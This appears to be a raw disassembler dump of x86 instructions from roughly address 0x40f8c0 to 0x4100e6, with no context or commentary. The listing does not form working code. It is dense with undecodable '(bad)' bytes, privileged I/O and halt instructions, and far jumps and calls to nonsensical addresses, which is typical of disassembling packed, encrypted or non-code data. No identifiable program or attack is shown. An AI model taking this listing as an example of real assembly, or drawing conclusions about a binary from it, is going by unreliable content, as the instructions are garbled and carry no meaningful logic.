  40f8c0:	into   
  40f8c1:	out    0xea,eax
  40f8c3:	mov    ebp,0xdbbeeabd
  40f8c8:	fistp  QWORD PTR [ebp-0xb1442fa]
  40f8ce:	rol    cl,0xfd
  40f8d1:	iret   
  40f8d2:	fild   DWORD PTR [ebx]
  40f8d4:	out    dx,al
  40f8d5:	or     al,0xc8
  40f8d7:	icebp  
  40f8d8:	(bad)  
  40f8d9:	out    dx,eax
  40f8da:	enter  0xadb5,0xad
  40f8de:	repz mov ebx,0xe4fbd2b0
  40f8e4:	jmp    0x40f8d1
  40f8e6:	mov    ecx,0xf1e3ecdd
  40f8eb:	xlat   BYTE PTR ds:[ebx]
  40f8ec:	mov    edx,0xf50102f5
  40f8f1:	jmp    0xbefc:0xfdd08fc
  40f8f8:	mov    bl,0xe9
  40f8fa:	imul   dl
  40f8fc:	jmp    0xf52be5ea
  40f901:	clc    
  40f902:	fcmovbe st,st(2)
  40f904:	icebp  
  40f905:	mov    ebp,0xcdedbed7
  40f90a:	mov    eax,0x3ddfd01
  40f90f:	fsqrt  
  40f911:	add    cl,BYTE PTR [edi]
  40f913:	ret    
  40f914:	clc    
  40f915:	rol    DWORD PTR [edx],cl
  40f917:	mov    esi,0xcfb0dce4
  40f91c:	lods   eax,DWORD PTR ds:[esi]
  40f91d:	call   0xff32ab0f
  40f922:	jmp    0xed16c919
  40f927:	mov    edx,0xfed2fefe
  40f92c:	idiv   DWORD PTR [eax+esi*8-0xaf1081a]
  40f933:	or     bl,cl
  40f935:	fucomp st(2)
  40f937:	fld    st(6)
  40f939:	mov    esp,0xc3d0b5e8
  40f93e:	(bad)  
  40f93f:	out    dx,eax
  40f940:	call   edi
  40f942:	sar    ch,1
  40f944:	iret   
  40f945:	mov    ecx,0xdfd0b8e3
  40f94a:	sti    
  40f94b:	mov    ebp,0xe3d2f6dd
  40f950:	(bad)
  40f953:	add    al,0xdd
  40f955:	fstp   st(4)
  40f957:	sar    BYTE PTR [ebp-0x534e4d44],0xf7
  40f95e:	repnz out 0xf1,al
  40f961:	in     al,0xd4
  40f963:	(bad)
  40f966:	add    ebx,ebp
  40f968:	sar    dh,0xbc
  40f96b:	add    al,dl
  40f96d:	stc    
  40f96e:	out    0x8,al
  40f970:	loope  0x40f93a
  40f972:	into   
  40f973:	aam    0xd8
  40f975:	add    edx,edi
  40f977:	lods   al,BYTE PTR ds:[esi]
  40f978:	enter  0xe9ed,0xf4
  40f97c:	ror    ch,cl
  40f97e:	in     eax,0xba
  40f980:	mov    bh,0xc5
  40f982:	aad    0xb4
  40f984:	fmul   st(0),st
  40f986:	(bad)  
  40f988:	in     al,dx
  40f989:	add    eax,DWORD PTR [ecx]
  40f98b:	cmc    
  40f98c:	shl    al,cl
  40f98e:	(bad)
  40f991:	pop    es
  40f992:	push   cs
  40f993:	int    0x0
  40f995:	int3   
  40f996:	in     al,dx
  40f997:	mov    esp,0xe2b3c1d2
  40f99c:	ret    0xead1
  40f99f:	out    dx,eax
  40f9a0:	mov    ch,0xb0
  40f9a2:	repnz aam 0xb6
  40f9a5:	retf   
  40f9a6:	out    dx,eax
  40f9a7:	fcomip st,st(1)
  40f9a9:	mov    ebp,0xcbddc001
  40f9ae:	loop   0x40f973
  40f9b0:	aam    0xa
  40f9b2:	pmullw mm4,mm2
  40f9b5:	adc    bh,cl
  40f9b7:	int    0xbc
  40f9b9:	test   al,0xd6
  40f9bb:	mov    dl,0xc9
  40f9bd:	mov    ch,0xbb
  40f9bf:	(bad)  
  40f9c0:	mov    dh,0xf5
  40f9c2:	(bad)  
  40f9c3:	(bad)  
  40f9c5:	shl    DWORD PTR [ecx+ecx*8-0x221d1d48],1
  40f9cc:	(bad)
  40f9d0:	or     al,bl
  40f9d2:	jmp    0xc6f3:0xf3c1c2e7
  40f9d9:	shl    BYTE PTR [ebx+eax*8-0xc2b113b],cl
  40f9e0:	clc    
  40f9e1:	cmc    
  40f9e2:	call   0xd91db6d1
  40f9e7:	fst    st(1)
  40f9e9:	out    0xce,al
  40f9eb:	add    eax,edx
  40f9ed:	cld    
  40f9ee:	sar    ch,cl
  40f9f0:	clc    
  40f9f1:	retf   
  40f9f2:	paddsb mm5,mm7
  40f9f5:	(bad)  [esi+eiz*8]
  40f9f8:	fidiv  WORD PTR [edi-0x37092a18]
  40f9fe:	jmp    0x40f9d4
  40fa00:	stc    
  40fa01:	fmulp  st(1),st
  40fa03:	fdiv   st(3),st
  40fa05:	lock enter 0xdacf,0xd3
  40fa0a:	std    
  40fa0b:	jecxz  0x40f9f4
  40fa0d:	dec    DWORD PTR [ebx]
  40fa0f:	sti    
  40fa10:	add    eax,0xea00c5ee
  40fa15:	fucomp st(2)
  40fa17:	mov    edi,0xeecaccec
  40fa1c:	(bad)
  40fa20:	icebp  
  40fa21:	rcl    bl,1
  40fa23:	in     al,0xf2
  40fa25:	rcr    edi,1
  40fa27:	loop   0x40fa11
  40fa29:	loop   0x40fa1d
  40fa2b:	fcomp  st(4)
  40fa2d:	fcomi  st,st(2)
  40fa2f:	or     eax,DWORD PTR [edx]
  40fa31:	cmc    
  40fa32:	or     edx,ebx
  40fa34:	(bad)
  40fa37:	mov    edi,0xb2f0f7bf
  40fa3c:	call   0xd0f8ec10
  40fa41:	sar    DWORD PTR [edx-0x352a1b0f],cl
  40fa47:	call   esi
  40fa49:	rcl    esp,cl
  40fa4b:	(bad)  
  40fa4d:	add    al,0xeb
  40fa4f:	shr    eax,1
  40fa51:	(bad)  
  40fa52:	(bad)  
  40fa53:	femms  
  40fa55:	repnz or ecx,esi
  40fa58:	ret    0xecce
  40fa5b:	out    dx,al
  40fa5c:	rcl    cl,1
  40fa5e:	(bad)  
  40fa5f:	mov    dl,0xb1
  40fa61:	lods   eax,DWORD PTR ds:[esi]
  40fa62:	aad    0xce
  40fa64:	aam    0xcb
  40fa66:	mov    esp,0xeecdfadf
  40fa6b:	mov    esi,0xd904d6f7
  40fa70:	(bad)  
  40fa72:	(bad)  
  40fa73:	(bad)  
  40fa74:	int3   
  40fa75:	adc    ah,dh
  40fa77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa78:	repnz loopne 0x40fa4d
  40fa7b:	enter  0xacdb,0xe9
  40fa7f:	ror    dh,0xc8
  40fa82:	fnstcw WORD PTR [esi-0x2a162c09]
  40fa88:	mov    eax,0xc105c7d2
  40fa8d:	jecxz  0x40fa6c
  40fa8f:	or     cl,BYTE PTR [edx]
  40fa91:	(bad)  
  40fa92:	(bad)  
  40fa94:	loope  0x40fa97
  40fa96:	(bad)  
  40fa98:	in     eax,0xea
  40fa9a:	lods   eax,DWORD PTR ds:[esi]
  40fa9b:	ror    ebx,cl
  40fa9d:	int3   
  40fa9e:	retf   0xe9f9
  40faa1:	(bad)  
  40faa2:	in     al,dx
  40faa3:	call   0xf735f87e
  40faa8:	into   
  40faa9:	int    0xf3
  40faab:	test   ecx,0xff5d1fd
  40fab1:	out    dx,eax
  40fab2:	or     ebx,ebp
  40fab4:	fdiv   st,st(2)
  40fab6:	out    0xd9,al
  40fab8:	call   0xb0f4e774
  40fabd:	jmp    0xffcc:0xbbffdac1
  40fac4:	int3   
  40fac5:	sti    
  40fac6:	mov    ebx,0xd3d3edc9
  40facb:	out    0xe1,al
  40facd:	faddp  st(2),st
  40facf:	(bad)  
  40fad1:	ffree  st(4)
  40fad3:	cld    
  40fad4:	int    0xf3
  40fad6:	add    al,al
  40fad8:	jmp    0xb6e1:0xf2c5b6ec
  40fadf:	clc    
  40fae0:	mov    dh,0xf0
  40fae2:	mov    edx,0xdde2f2f3
  40fae7:	mov    esi,0xe3fbf6f0
  40faec:	(bad)  
  40faed:	(bad)  
  40faee:	out    0xff,eax
  40faf0:	push   es
  40faf1:	std    
  40faf2:	hlt    
  40faf3:	inc    esi
  40faf5:	iret   
  40faf6:	out    dx,eax
  40faf7:	mov    bl,0xe3
  40faf9:	shl    dl,1
  40fafb:	scas   al,BYTE PTR es:[edi]
  40fafc:	sar    edx,1
  40fafe:	xlat   BYTE PTR ds:[ebx]
  40faff:	jmp    0xd61bf0b9
  40fb04:	(bad)  
  40fb05:	mov    ebx,0xc1eebee2
  40fb0a:	hlt    
  40fb0b:	std    
  40fb0c:	shl    ah,cl
  40fb0e:	hlt    
  40fb0f:	call   0xec1cf110
  40fb14:	fcom   QWORD PTR [edx]
  40fb16:	in     al,0xb8
  40fb18:	mov    bl,0xce
  40fb1a:	shl    al,1
  40fb1c:	repnz rcr ebx,0xca
  40fb20:	in     eax,0xb1
  40fb22:	lds    esi,FWORD PTR [edi-0x172a0304]
  40fb28:	std    
  40fb29:	mov    ebp,0x1c7bcd7
  40fb2e:	jmp    0x40fb2d
  40fb30:	fdivp  st(7),st
  40fb32:	out    dx,al
  40fb33:	aam    0xa
  40fb35:	add    al,0xa
  40fb37:	in     al,dx
  40fb38:	test   eax,0xe0b2d0a9
  40fb3d:	retf   
  40fb3e:	loope  0x40faef
  40fb40:	cli    
  40fb41:	(bad)  
  40fb42:	bnd call 0xf123c444
  40fb48:	xlat   BYTE PTR ds:[ebx]
  40fb49:	repnz idiv DWORD PTR [ebx+0xbe0e30b]
  40fb50:	add    eax,0xf9e108d6
  40fb55:	fucom  st(2)
  40fb57:	iret   
  40fb58:	out    0xd0,al
  40fb5a:	cmc    
  40fb5b:	aam    0xcb
  40fb5d:	shl    esp,1
  40fb5f:	sar    DWORD PTR [ecx-0x1b4a5307],1
  40fb65:	fdiv   DWORD PTR [eax-0x4b0a0621]
  40fb6b:	rol    BYTE PTR [eax+ebx*8],0xe4
  40fb6f:	stc    
  40fb70:	add    ah,bh
  40fb72:	out    0x1,eax
  40fb74:	add    edx,DWORD PTR [edx]
  40fb76:	jmp    0xedc9:0xccc1eee3
  40fb7d:	lods   al,BYTE PTR ds:[esi]
  40fb7e:	(bad)  
  40fb7f:	mov    bh,0xe9
  40fb81:	lock jmp 0x40fb7c
  40fb84:	mov    dh,0xdd
  40fb86:	rol    DWORD PTR [ecx],1
  40fb88:	iret   
  40fb89:	mov    esi,0xc3f5c7e2
  40fb8e:	lock (bad) 
  40fb90:	loope  0x40fba0
  40fb92:	(bad)  
  40fb94:	mov    ah,0xa
  40fb97:	loope  0x40fb8a
  40fb99:	rcl    bh,cl
  40fb9b:	aad    0xbc
  40fb9d:	mov    ebx,0xcad2e0eb
  40fba2:	(bad)  
  40fba3:	int    0xeb
  40fba5:	imul   esi
  40fba7:	fcomp  st(3)
  40fba9:	mov    ecx,0xd7e5ede5
  40fbae:	or     ebx,esi
  40fbb0:	in     eax,0xde
  40fbb2:	cmc    
  40fbb3:	add    eax,0xcafacd02
  40fbb8:	into   
  40fbb9:	out    0xcf,al
  40fbbb:	retf   
  40fbbc:	rcr    ebx,0xf5
  40fbbf:	out    0xb1,al
  40fbc1:	clc    
  40fbc2:	fcomp  st(1)
  40fbc4:	jmp    0x40fbb5
  40fbc6:	mov    al,0xfe
  40fbc8:	cld    
  40fbc9:	ret    0xfcbf
  40fbcc:	ror    DWORD PTR [ebx],cl
  40fbce:	icebp  
  40fbcf:	in     al,0xe3
  40fbd1:	std    
  40fbd2:	jmp    0x139cbc4
  40fbd7:	mov    esp,0xf4c0c5b8
  40fbdc:	int3   
  40fbdd:	fcmovnb st,st(7)
  40fbdf:	int3   
  40fbe0:	in     eax,0xc5
  40fbe2:	int    0xf0
  40fbe4:	xlat   BYTE PTR ds:[ebx]
  40fbe5:	clc    
  40fbe6:	fidivr WORD PTR [eax+ebp*8-0xcfe4327]
  40fbed:	aad    0xf9
  40fbef:	(bad)  
  40fbf1:	mov    ebp,0xea00ecf9
  40fbf6:	or     edi,DWORD PTR [ecx-0x4a2e4141]
  40fbfc:	shl    BYTE PTR [ebx-0x13364f32],cl
  40fc02:	mov    bh,0xcc
  40fc04:	cmc    
  40fc05:	clc    
  40fc06:	mov    ebp,0xceecfbe3
  40fc0b:	hlt    
  40fc0c:	pop    es
  40fc0d:	cmc    
  40fc0e:	add    bl,al
  40fc10:	in     eax,0xf7
  40fc12:	jmp    0x40fc16
  40fc14:	iret   
  40fc15:	shl    edx,cl
  40fc17:	fdivr  QWORD PTR [eax+ecx*8-0x33344329]
  40fc1e:	(bad)  
  40fc1f:	shl    edi,1
  40fc21:	out    dx,eax
  40fc22:	mov    ah,0xee
  40fc24:	mov    ebx,0xbfd7fcbc
  40fc29:	test   DWORD PTR [ebx],0xdfe6d9d7
  40fc2f:	(bad)  
  40fc30:	les    eax,FWORD PTR [esi]
  40fc32:	push   es
  40fc33:	retf   0x1209
  40fc36:	in     eax,0xc1
  40fc38:	lods   al,BYTE PTR ds:[esi]
  40fc39:	int3   
  40fc3a:	into   
  40fc3b:	loope  0x40fc06
  40fc3d:	sar    cl,cl
  40fc3f:	into   
  40fc40:	in     al,dx
  40fc41:	out    0xf4,al
  40fc43:	fdiv   st(0),st
  40fc45:	int    0xfb
  40fc47:	mov    esp,0x4bddff0
  40fc4c:	jecxz  0x40fc14
  40fc4e:	add    eax,0xdaff07c6
  40fc53:	in     eax,0xdb
  40fc55:	in     eax,dx
  40fc56:	les    esp,FWORD PTR [edi-0x230e4d53]
  40fc5c:	mov    ah,0xda
  40fc5e:	rcr    eax,0xd6
  40fc61:	fcmovbe st,st(2)
  40fc63:	retf   0xd5d8
  40fc66:	int    0xfb
  40fc68:	aam    0xe1
  40fc6a:	loopne 0x40fc28
  40fc6c:	rcr    al,cl
  40fc6e:	or     ebp,ecx
  40fc70:	or     BYTE PTR [edx],cl
  40fc72:	or     al,ah
  40fc74:	enter  0xfcce,0xd9
  40fc78:	enter  0xcfed,0xc1
  40fc7c:	in     eax,dx
  40fc7d:	lods   al,BYTE PTR ds:[esi]
  40fc7e:	(bad)
  40fc81:	lods   eax,DWORD PTR ds:[esi]
  40fc82:	iret   
  40fc83:	mov    ebx,0xecfde2ff
  40fc88:	fdiv   st(4),st
  40fc8a:	(bad)  
  40fc8b:	sar    DWORD PTR [ebx+esi*8-0x20f2844],cl
  40fc92:	enter  0xe1e0,0x5
  40fc96:	in     al,0xcc
  40fc98:	int    0xe2
  40fc9a:	loope  0x40fc48
  40fc9c:	hlt    
  40fc9d:	in     eax,0xdb
  40fc9f:	int3   
  40fca0:	lock mov bh,0xf7
  40fca3:	out    dx,eax
  40fca4:	fdivr  st,st(5)
  40fca6:	fdiv   st,st(2)
  40fca8:	mov    dh,0x7
  40fcaa:	mov    edi,0xf9dcdfdd
  40fcaf:	leave  
  40fcb0:	leave  
  40fcb1:	rcl    ch,0xc7
  40fcb4:	call   0xe12aedbb
  40fcb9:	call   0xf70ddfac
  40fcbe:	int    0xf5
  40fcc0:	mov    edx,0x3e9cbb1
  40fcc5:	rol    DWORD PTR [ecx],cl
  40fcc7:	iret   
  40fcc8:	int    0xd4
  40fcca:	aam    0xf2
  40fccc:	hlt    
  40fccd:	add    ecx,DWORD PTR [ecx]
  40fccf:	aad    0xc2
  40fcd1:	fld    st(6)
  40fcd3:	jmp    0xc6df:0xd9d2c513
  40fcda:	mov    bl,0xd2
  40fcdc:	in     eax,dx
  40fcdd:	hlt    
  40fcde:	leave  
  40fcdf:	sti    
  40fce0:	clc    
  40fce1:	mov    bh,0xe4
  40fce3:	jmp    0xdcce:0xfeccf0d4
  40fcea:	clc    
  40fceb:	mov    edx,0xd7fce4d2
  40fcf1:	out    0xce,al
  40fcf3:	aam    0xc2
  40fcf5:	int3   
  40fcf6:	adc    eax,eax
  40fcf8:	ror    ebx,0xae
  40fcfb:	imul   ch
  40fcfd:	retf   0xcab3
  40fd00:	mov    dh,0xfa
  40fd02:	mov    edx,0x1fecbc4
  40fd07:	loop   0x40fcfc
  40fd09:	fsub   st(6),st
  40fd0b:	int    0xfe
  40fd0d:	add    ecx,DWORD PTR [ebx]
  40fd0f:	in     al,0xd6
  40fd11:	div    dh
  40fd13:	in     al,dx
  40fd14:	clts   
  40fd16:	add    eax,0xebd1ccc4
  40fd1b:	out    dx,al
  40fd1c:	out    0xd3,eax
  40fd1e:	sti    
  40fd1f:	retf   0xd5f5
  40fd22:	test   ecx,0xdfe1f7b5
  40fd28:	mov    edx,0xf8bdbec0
  40fd2d:	add    DWORD PTR [eax-0x291ffe],edi
  40fd33:	stc    
  40fd34:	retf   
  40fd35:	pmulhuw mm4,mm3
  40fd38:	in     al,dx
  40fd39:	call   0xeaf5d320
  40fd3e:	loop   0x40fd0f
  40fd40:	mov    eax,0xe8ebf1f9
  40fd45:	(bad)  
  40fd46:	(bad)  
  40fd47:	clc    
  40fd48:	repz in eax,dx
  40fd4a:	sar    DWORD PTR [esi-0x1a3e3efc],1
  40fd50:	add    al,al
  40fd52:	(bad)  
  40fd53:	loopne 0x40fd68
  40fd55:	(bad)  
  40fd56:	fsubrp st(4),st
  40fd58:	fdiv   st,st(7)
  40fd5a:	lods   al,BYTE PTR ds:[esi]
  40fd5b:	cmc    
  40fd5c:	leave  
  40fd5d:	out    dx,eax
  40fd5e:	loopne 0x40fd37
  40fd60:	out    0xf9,eax
  40fd62:	(bad)  
  40fd63:	aam    0xf7
  40fd65:	div    eax
  40fd67:	mov    eax,0xc5e5d5f9
  40fd6c:	pop    es
  40fd6d:	mov    esp,0xe9e20301
  40fd72:	add    eax,0xe3f8f3fc
  40fd77:	retf   
  40fd78:	retf   
  40fd79:	in     eax,dx
  40fd7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd7b:	(bad)  
  40fd7c:	jecxz  0x40fd33
  40fd7e:	mov    dl,0xc0
  40fd80:	scas   al,BYTE PTR es:[edi]
  40fd81:	lods   eax,DWORD PTR ds:[esi]
  40fd82:	test   edi,0xb9c3f6e8
  40fd88:	cmc    
  40fd89:	sar    bl,1
  40fd8b:	mov    edi,0x9f2f5d9
  40fd90:	rcr    ch,0xf6
  40fd93:	jmp    0x40fd83
  40fd95:	add    ebx,esp
  40fd97:	out    0xd8,eax
  40fd99:	out    0xcb,al
  40fd9b:	rol    esp,cl
  40fd9d:	jmp    0xf1ed:0xb0b5d4e7
  40fda4:	aad    0xc9
  40fda6:	jmp    0xc335f965
  40fdab:	out    0xc7,eax
  40fdad:	shl    edi,0x1
  40fdb0:	(bad)  
  40fdb1:	cld    
  40fdb2:	retf   0xe1ce
  40fdb5:	(bad)  
  40fdb6:	fsub   QWORD PTR [edi-0x332d3e20]
  40fdbc:	loopne 0x40fd8a
  40fdbe:	jmp    0xd3b3:0xf5cfe4f5
  40fdc5:	retf   
  40fdc6:	ret    
  40fdc7:	shl    BYTE PTR [esi-0x421c2739],cl
  40fdcd:	cli    
  40fdce:	rcl    cl,cl
  40fdd0:	(bad)  
  40fdd2:	(bad)  [edx]
  40fdd4:	aam    0xcd
  40fdd6:	out    0xd9,eax
  40fdd8:	mov    al,0xe3
  40fdda:	loope  0x40fd9f
  40fddc:	loop   0x40fdcd
  40fdde:	fyl2x  
  40fde0:	sti    
  40fde1:	in     eax,dx
  40fde2:	enter  0xf5e5,0xe3
  40fde6:	sti    
  40fde7:	leave  
  40fde8:	ret    0xe0ec
  40fdeb:	aad    0xe6
  40fded:	repnz shl ecx,0x7
  40fdf1:	psubusb mm1,QWORD PTR [esi]
  40fdf4:	sti    
  40fdf5:	fst    st(3)
  40fdf7:	mov    esi,0xd2e8d7e3
  40fdfc:	shl    ah,0xe8
  40fdff:	mov    ch,0xcd
  40fe01:	jmp    0x40fdf3
  40fe03:	mov    edx,0xe9ffdcbc
  40fe08:	mov    dh,0x6
  40fe0a:	int3   
  40fe0b:	in     al,dx
  40fe0c:	neg    ebp
  40fe0e:	fadd   QWORD PTR [esi+edx*8]
  40fe11:	cld    
  40fe12:	aam    0xc9
  40fe14:	add    ch,ch
  40fe16:	sar    BYTE PTR [edi-0x14494023],cl
  40fe1c:	shl    BYTE PTR [ebx-0x2e351a27],cl
  40fe22:	retf   0xefce
  40fe25:	repz (bad) 
  40fe27:	repz (bad) 
  40fe29:	not    cl
  40fe2b:	fnstcw WORD PTR [edx+eax*1+0xac204d1]
  40fe32:	leave  
  40fe33:	loopne 0x40fe48
  40fe35:	fucomi st,st(4)
  40fe37:	(bad)  
  40fe39:	in     eax,dx
  40fe3a:	test   al,0xf0
  40fe3c:	rcr    dl,1
  40fe3e:	lods   al,BYTE PTR ds:[esi]
  40fe3f:	scas   eax,DWORD PTR es:[edi]
  40fe40:	in     al,dx
  40fe41:	aam    0xc5
  40fe43:	enter  0x2eb,0xfa
  40fe47:	mov    ebp,0xf0edd6fd
  40fe4c:	clc    
  40fe4d:	or     ebx,edi
  40fe4f:	add    DWORD PTR [edx],eax
  40fe51:	(bad)  
  40fe53:	(bad)  
  40fe54:	loopne 0x40fe42
  40fe56:	shl    BYTE PTR [edi-0x1c2e4d2e],0xee
  40fe5d:	loop   0x40fe20
  40fe5f:	(bad)  
  40fe61:	(bad)  
  40fe62:	int3   
  40fe63:	shl    ch,cl
  40fe65:	ret    
  40fe66:	sar    DWORD PTR [edx-0x2f002fff],1
  40fe6c:	mov    esi,0xf0ea0bd3
  40fe71:	call   0xcc09fc72
  40fe76:	loop   0x40fe38
  40fe78:	test   al,0xcb
  40fe7a:	scas   eax,DWORD PTR es:[edi]
  40fe7b:	ret    0xe2f6
  40fe7e:	out    dx,al
  40fe7f:	retf   0xd6cc
  40fe82:	hlt    
  40fe83:	sti    
  40fe84:	leave  
  40fe85:	mov    edi,0xbfd7cfdb
  40fe8a:	div    edx
  40fe8c:	jmp    0x40fe7e
  40fe8e:	out    0xf4,al
  40fe90:	rol    BYTE PTR [edi],0xde
  40fe93:	add    al,0x0
  40fe95:	adc    eax,DWORD PTR [ecx]
  40fe97:	ror    esp,cl
  40fe99:	repnz les ebp,FWORD PTR [esi-0x1b0b2a34]
  40fea0:	aad    0xf7
  40fea2:	lods   al,BYTE PTR ds:[esi]
  40fea3:	in     eax,dx
  40fea4:	into   
  40fea5:	stc    
  40fea6:	cmc    
  40fea7:	icebp  
  40fea8:	cld    
  40fea9:	inc    BYTE PTR [edi]
  40feab:	(bad)  
  40fead:	shl    eax,cl
  40feaf:	mov    edi,0x4fabdbe
  40feb4:	retf   0x3eb
  40feb7:	out    dx,eax
  40feb8:	mov    eax,0xe9c6b3c3
  40febd:	call   0xeb08c399
  40fec2:	fdivp  st(4),st
  40fec4:	mov    dh,0xbf
  40fec6:	mov    ebp,0xe0fbd2e8
  40fecb:	repnz in eax,0xe6
  40fece:	cli    
  40fecf:	fsubrp st(0),st
  40fed1:	les    ecx,FWORD PTR [edx]
  40fed3:	push   cs
  40fed4:	loopne 0x40fee4
  40fed6:	jmp    0xc7ad:0xf6b3b0c2
  40fedd:	xlat   BYTE PTR ds:[ebx]
  40fede:	fnsetpm(287 only) 
  40fee0:	hlt    
  40fee1:	mov    ecx,0xdce3dbf7
  40fee6:	mov    esp,0xd5dec8d8
  40feeb:	in     al,dx
  40feec:	in     al,0xf6
  40feee:	jmp    0xecec:0xdf0edc0a
  40fef5:	jmp    0xbdc8:0xcccbe3d2
  40fefc:	(bad)  
  40fefd:	int    0xb6
  40feff:	(bad)  
  40ff00:	shl    ecx,cl
  40ff02:	mov    esi,0xd8eeb2dd
  40ff07:	mov    esi,0xd4b8f2f6
  40ff0c:	in     eax,0xea
  40ff0e:	(bad)  
  40ff10:	cld    
  40ff11:	mov    ebp,0xddc60cc0
  40ff16:	or     dl,ch
  40ff18:	rcr    ah,cl
  40ff1a:	test   ebp,0xb7f4e4e9
  40ff20:	repnz xlat BYTE PTR ds:[ebx]
  40ff22:	cmc    
  40ff23:	shl    BYTE PTR [esi-0x25fefc04],cl
  40ff29:	shl    ebp,0xfa
  40ff2c:	shl    al,0xd5
  40ff2f:	leave  
  40ff30:	retf   
  40ff31:	or     eax,ecx
  40ff33:	add    bl,al
  40ff35:	leave  
  40ff36:	add    al,dh
  40ff38:	in     eax,0xb3
  40ff3a:	retf   
  40ff3b:	jmp    0x40ff23
  40ff3d:	mov    ah,0xe4
  40ff3f:	in     eax,dx
  40ff40:	retf   
  40ff41:	lods   eax,DWORD PTR ds:[esi]
  40ff42:	mov    al,0xeb
  40ff44:	mov    ebx,0xedc2e2f2
  40ff49:	shl    DWORD PTR [esp+edi*4+0x80adbba],1
  40ff50:	loope  0x40ff21
  40ff52:	jmp    0xbfcf:0xd201fee0
  40ff59:	repz sar DWORD PTR [esi+edx*8-0x4d044a0b],0xf9
  40ff62:	aam    0xec
  40ff64:	(bad)  
  40ff65:	icebp  
  40ff66:	std    
  40ff67:	mov    ecx,0xf4d3d9f4
  40ff6c:	mov    esi,0xfbd102bd
  40ff71:	or     BYTE PTR [eax],cl
  40ff73:	add    bl,bl
  40ff75:	add    ecx,DWORD PTR [edi]
  40ff77:	lods   eax,DWORD PTR ds:[esi]
  40ff78:	les    ebp,FWORD PTR [ebp-0x304e1315]
  40ff7e:	aam    0xf7
  40ff80:	loopne 0x40ff38
  40ff82:	mov    ecx,0xcdbdd0fb
  40ff87:	out    dx,eax
  40ff88:	mov    edx,0xd802d7c1
  40ff8d:	loop   0x40ff4f
  40ff8f:	fadd   st(7),st
  40ff91:	or     ebp,ecx
  40ff93:	or     esi,esp
  40ff95:	push   cs
  40ff96:	stc    
  40ff97:	jmp    0xb2ef:0xc3cfa8d1
  40ff9e:	shr    cl,cl
  40ffa0:	fnstenv [ecx-0x220b3a1a]
  40ffa6:	mov    edx,0xdad9dce3
  40ffab:	add    BYTE PTR [ebx],cl
  40ffad:	ror    DWORD PTR [edx],cl
  40ffaf:	mov    BYTE PTR [edi],0xdd
  40ffb2:	loop   0x40ff9d
  40ffb4:	fcmovnb st,st(1)
  40ffb6:	call   0xd01feea8
  40ffbb:	mov    cl,0xc3
  40ffbd:	in     al,0xec
  40ffbf:	mov    cl,0xb0
  40ffc1:	lock neg ah
  40ffc4:	into   
  40ffc5:	(bad)  
  40ffc6:	in     al,dx
  40ffc7:	leave  
  40ffc8:	mov    ebp,0x5f3bce1
  40ffcd:	cld    
  40ffce:	jmp    0xca360fb0
  40ffd3:	psubusw mm0,QWORD PTR [edx]
  40ffd6:	or     al,0xa9
  40ffd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffd9:	not    cl
  40ffdb:	retf   0xc5b2
  40ffde:	stc    
  40ffdf:	(bad)  
  40ffe1:	mov    dh,0xfd
  40ffe3:	(bad)  
  40ffe4:	mov    dl,0xd2
  40ffe6:	imul   esi
  40ffe8:	in     al,dx
  40ffe9:	out    dx,eax
  40ffea:	stc    
  40ffeb:	fld    QWORD PTR [edx]
  40ffed:	mov    ecx,0xe7d6dcfa
  40fff2:	or     bl,ch
  40fff4:	cld    
  40fff5:	(bad)  
  40fff6:	jmp    0xca17efeb
  40fffb:	enter  0xccd2,0xb2
  40ffff:	enter  0xd9b7,0xd1
  410003:	lock retf 0xfafe
  410007:	(bad)  
  410008:	mov    edi,0xd5faf207
  41000d:	loopne 0x41000c
  41000f:	jmp    0x2e4:0x6fcc4d5
  410016:	jmp    0x40ffd7
  410018:	bnd jmp 0x40ffea
  41001b:	in     al,0xec
  41001d:	hlt    
  41001e:	out    0xf3,eax
  410020:	hlt    
  410021:	les    esi,FWORD PTR [edi-0x27023031]
  410027:	fcmovnu st,st(5)
  410029:	(bad)  
  41002a:	mov    esi,0x700c4cd
  41002f:	(bad)  
  410030:	fmul   DWORD PTR [esi]
  410032:	cld    
  410033:	out    0xff,eax
  410035:	add    ecx,DWORD PTR [edx]
  410037:	(bad)
  41003a:	out    0xd0,eax
  41003c:	retf   
  41003d:	mov    dl,0xc6
  41003f:	leave  
  410040:	jmp    0xc00fbc1f
  410045:	mov    edx,0xc1f0f5fb
  41004a:	rol    BYTE PTR [edi],0xf2
  41004d:	repnz stc 
  41004f:	(bad)  
  410050:	clc    
  410051:	retf   
  410052:	aam    0xe
  410054:	(bad)  
  410056:	adc    al,cl
  410058:	out    dx,eax
  410059:	shl    edx,cl
  41005b:	scas   al,BYTE PTR es:[edi]
  41005c:	aad    0xb1
  41005e:	jmp    0xcbe4:0xfebbf0ec
  410065:	jmp    0xbd14d064
  41006a:	mov    DWORD PTR ds:0xcb09ebfa,0xedfec1db
  410074:	(bad)  
  410076:	(bad)  
  410077:	fcomip st,st(7)
  410079:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41007a:	in     eax,0xc2
  41007c:	hlt    
  41007d:	cli    
  41007e:	test   al,0xe7
  410080:	stc    
  410081:	lock into 
  410083:	mov    esi,0xe1d2d5e3
  410088:	call   0xf044d490
  41008d:	jmp    ebx
  41008f:	or     al,ch
  410091:	(bad)  
  410092:	fsub   st(6),st
  410094:	call   DWORD PTR [ebx]
  410096:	fnstenv [ebx-0x323c5254]
  41009c:	ror    al,1
  41009e:	mov    dl,0xd3
  4100a0:	into   
  4100a1:	jmp    0xe8e3:0xd4fdd7c4
  4100a8:	hlt    
  4100a9:	aad    0x1
  4100ab:	in     al,dx
  4100ac:	lock in eax,0xd4
  4100af:	lock in eax,0x2
  4100b2:	fucomip st,st(6)
  4100b4:	(bad)  
  4100b6:	retf   0xe8cd
  4100b9:	jecxz  0x41006e
  4100bb:	ret    0xf4f4
  4100be:	enter  0xf5f2,0xd7
  4100c2:	fcmovne st,st(6)
  4100c4:	mov    eax,0xccd6dc02
  4100c9:	shr    esp,1
  4100cb:	ret    0xdb03
  4100ce:	(bad)  
  4100cf:	idiv   edi
  4100d1:	retf   
  4100d2:	std    
  4100d3:	jmp    0xe63307a7
  4100d8:	shl    edi,1
  4100da:	int3   
  4100db:	out    dx,al
  4100dc:	icebp  
  4100dd:	lods   al,BYTE PTR ds:[esi]
  4100de:	mov    bh,0xec
  4100e0:	in     eax,0xb7
  4100e2:	mov    ah,0xf8
  4100e4:	fprem  
  4100e6:	sti    
